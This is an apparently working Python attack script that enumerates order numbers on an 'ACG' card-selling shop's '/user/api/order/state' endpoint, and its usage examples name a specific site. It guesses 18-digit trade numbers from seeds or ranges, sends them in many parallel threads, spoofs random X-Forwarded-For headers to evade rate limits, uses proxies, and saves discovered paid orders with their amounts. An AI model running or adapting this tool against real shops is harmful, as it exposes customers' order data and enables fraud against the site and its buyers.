#!/usr/bin/env python3
"""
订单号 / trade_no 批量枚举（ACG order/state）。

trade_no 格式通常为 18 位数字。支持:
  - 前缀 + 中段固定 + 后缀递增
  - 从文件读取种子再变异
  - 纯递增数字

示例:
  python3 order_enum.py -u https://zhanghao9.com --prefix 903 --middle 26070403 --start 264000000000 --end 264000000100
  python3 order_enum.py -u https://zhanghao9.com --seeds 903260704032647527,116260704032648926 --vary-last 50
  python3 order_enum.py -u https://zhanghao9.com -f seeds.txt --paid-only -w 30 --xff
"""
from __future__ import annotations

import argparse
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Iterator

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, load_wordlist, log, random_xff_headers, resolve_proxy, save_hit


def gen_trade_nos(args: argparse.Namespace) -> Iterator[str]:
    if args.prefix and args.middle is not None and args.start is not None and args.end is not None:
        mid = str(args.middle)
        for i in range(args.start, args.end + 1):
            suffix = str(i)
            tn = f"{args.prefix}{mid}{suffix}"
            if args.length > 0:
                tn = tn[: args.length].ljust(args.length, "0")
            yield tn
        return

    seeds: list[str] = []
    if args.seeds:
        seeds.extend(x.strip() for x in args.seeds.split(",") if x.strip())
    if args.wordlist:
        seeds.extend(load_wordlist(args.wordlist, offset=args.offset, limit=args.limit or None))

    if not seeds and args.start is not None and args.end is not None:
        width = args.length or len(str(args.end))
        for i in range(args.start, args.end + 1):
            yield str(i).zfill(width)
        return

    for s in seeds:
        yield s
        if args.vary_last > 0 and s.isdigit():
            base = s[:-args.vary_last] if len(s) > args.vary_last else ""
            tail = s[-args.vary_last:]
            try:
                start = max(0, int(tail) - args.vary_last)
                end = int(tail) + args.vary_last
            except ValueError:
                continue
            for n in range(start, end + 1):
                yield base + str(n).zfill(len(tail))


def probe_state(base: str, trade_no: str, timeout: int, proxy: str, use_xff: bool) -> dict | None:
    url = base.rstrip("/") + "/user/api/order/state"
    headers = {"User-Agent": DEFAULT_UA}
    if use_xff:
        headers.update(random_xff_headers())
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = requests.post(url, data={"tradeNo": trade_no}, headers=headers, timeout=timeout, proxies=proxies, verify=False)
        data = json_or_text(r)
        return data if isinstance(data, dict) else None
    except Exception:
        return None


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="ACG trade_no 枚举")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--prefix", default="")
    ap.add_argument("--middle", default="")
    ap.add_argument("--start", type=int, default=None)
    ap.add_argument("--end", type=int, default=None)
    ap.add_argument("--length", type=int, default=18)
    ap.add_argument("--seeds", default="")
    ap.add_argument("-f", "--wordlist", default="")
    ap.add_argument("--offset", type=int, default=0)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--vary-last", type=int, default=0, help="种子订单尾部 +/-N")
    ap.add_argument("--paid-only", action="store_true")
    ap.add_argument("--exists-only", action="store_true", help="任意存在的订单")
    ap.add_argument("-w", "--workers", type=int, default=20)
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/order_enum.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy(args.proxy)
    trade_nos = list(gen_trade_nos(args))
    if not trade_nos:
        raise SystemExit("未生成任何 trade_no，检查参数")

    log(f"枚举 {args.url} | {len(trade_nos):,} 个 trade_no | workers={args.workers}")
    hits = exists = 0
    start = time.time()

    def task(tn: str):
        data = probe_state(args.url, tn, args.timeout, proxy, args.xff)
        return tn, data

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(task, tn): tn for tn in trade_nos}
        for i, fut in enumerate(as_completed(futs), 1):
            tn, data = fut.result()
            if not data or data.get("code") != 200:
                continue
            d = data.get("data") or {}
            exists += 1
            paid = d.get("status") == 1
            if args.paid_only and not paid:
                continue
            if args.exists_only or args.paid_only or paid:
                hits += 1
                save_hit(Path(args.out), "order_found", {"trade_no": tn, "paid": paid, "data": d})
                tag = "PAID" if paid else "OPEN"
                log(f"[+] {tag} {tn} id={d.get('id')} amount={d.get('amount')} status={d.get('status')}")
            if i % 500 == 0:
                log(f"  progress {i:,}/{len(trade_nos):,} exists={exists} hits={hits}")

    elapsed = time.time() - start
    log(f"完成 exists={exists} hits={hits} {elapsed:.1f}s -> {args.out}")


if __name__ == "__main__":
    main()
